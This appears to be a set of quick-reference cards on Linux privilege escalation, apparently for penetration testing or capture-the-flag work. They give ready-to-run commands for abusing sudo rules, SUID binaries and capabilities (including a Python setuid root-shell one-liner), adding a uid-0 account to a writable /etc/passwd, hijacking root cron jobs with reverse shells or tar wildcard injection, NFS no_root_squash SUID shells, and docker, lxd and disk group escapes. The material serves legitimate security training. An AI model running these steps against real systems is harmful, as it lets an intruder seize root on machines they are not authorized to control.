title: sudo -l → escalate
inline_answer:
```
sudo -l
```

For every allowed binary check **GTFOBins → Sudo**. Watch for: `(ALL) NOPASSWD: ALL`; `env_keep+=LD_PRELOAD` / `LD_LIBRARY_PATH`; `(user)` not root (pivot to that user); a script you can edit; `sudoedit` / wildcard. Also `sudo --version` ≤1.8.31 → Baron Samedit (CVE-2021-3156).

title: Find & abuse SUID binaries
inline_answer:
```
find / -perm -4000 -type f 2>/dev/null
```

Cross-check each non-standard hit against **GTFOBins → SUID**. Custom SUID binary? `strings`/`ltrace` it for a relative-path command call → PATH hijack. SGID: `-perm -2000`.

title: Linux capabilities → root
inline_answer:
```
getcap -r / 2>/dev/null
```

`cap_setuid+ep` on python/perl/php → instant root (`python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'`). `cap_dac_read_search` → read any file (shadow). `cap_dac_override` → write any file. Check GTFOBins → Capabilities.

title: Writable /etc/passwd → root
inline_answer:
```
openssl passwd -1 -salt x Pass123          # -> $1$x$...
echo 'r00t:$1$x$...:0:0:root:/root:/bin/bash' >> /etc/passwd
su r00t        # Pass123
```

Also check writable `/etc/shadow` (replace root's hash) and writable `/etc/sudoers` / `sudoers.d`.

title: Cron job abuse
inline_answer:
```
cat /etc/crontab; ls -la /etc/cron.*; ./pspy64        # watch for root jobs
```

Writable script run by root → append a reverse shell. Root cron calling a relative binary → PATH hijack. `tar *`/`rsync *` in a writable dir → wildcard injection (`--checkpoint-action=exec`). pspy reveals jobs not in crontab.

title: NFS no_root_squash → root
inline_answer:
```
showmount -e TARGET                  # look for an export with no_root_squash
mkdir /mnt/x && mount -o rw TARGET:/export /mnt/x
# as root on Kali:
cp /bin/bash /mnt/x/bash && chmod +s /mnt/x/bash
# on target as the low user:
/export/bash -p          # euid root
```

title: Dangerous group membership (docker/lxd/disk/adm)
inline_answer:
From `id`:

- **docker** → `docker run -v /:/mnt -it alpine chroot /mnt sh`
- **lxd/lxc** → import Alpine image, init container with `security.privileged`, mount `/`
- **disk** → `debugfs /dev/sda1` → read/write any file (shadow, sudoers)
- **adm** → read all logs (creds, paths) — not direct root but high-value
